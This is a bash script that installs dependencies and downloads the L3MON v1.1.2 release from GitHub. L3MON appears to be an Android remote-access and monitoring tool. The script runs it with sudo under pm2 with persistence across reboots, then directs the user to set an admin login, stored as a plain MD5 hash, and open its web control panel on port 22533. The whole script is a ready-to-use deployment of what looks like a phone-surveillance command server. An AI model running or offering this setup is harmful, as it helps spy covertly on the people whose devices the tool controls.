#!/bin/bash
sudo apt update -y;
sudo apt install npm unzip python3 python3-pip -y;
sudo apt install openjdk-8-jre nano openvpn -y;
sudo npm install pm2 -g;
wget https://github.com/D3VL/L3MON/releases/download/1.1.2/L3MON-v1.1.2.zip;
unzip L3MON-v1.1.2.zip;
sudo npm install;
sudo npm install -g npm;
sudo pm2 start index.js;
sudo pm2 startup;
sudo pm2 stop index;
echo "


    Set a Username & Password:
    
        Open maindb.json in a text editor
        under admin
            set the username as plain text
            set the password as a LOWERCASE MD5 hash
        save the file
        run pm2 restart all

    in your browser navigate to http://<SERVER IP>:22533
"
exit
